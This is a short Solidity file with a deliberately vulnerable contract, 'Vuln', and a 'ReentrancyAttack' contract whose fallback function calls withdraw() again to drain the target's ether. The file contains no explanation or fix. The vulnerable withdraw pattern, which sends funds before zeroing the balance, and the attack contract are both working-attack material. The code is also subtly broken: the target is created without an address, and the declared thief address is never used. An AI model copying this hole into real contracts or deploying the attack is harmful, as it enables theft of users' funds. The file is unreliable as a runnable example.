contract Vuln {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        
        msg.sender.call.value(balances[msg.sender])("");

        
        balances[msg.sender] = 0;
    }
}
contract ReentrancyAttack {
    Vuln target = Vuln();
    uint amount = 500 wei;
    uint maxwithdraw = 0;
   address payable theif = msg.sender;

   function depositamount() public payable{
        target.deposit.value(msg.value)();
     
    }
    function withdrawamount() public payable{
     
        target.withdraw();
    }

     function () external payable{
        if (maxwithdraw < 5){
            maxwithdraw++;

            if (address(target).balance >= amount)
                {
                target.withdraw();
                }
        }
     }
}
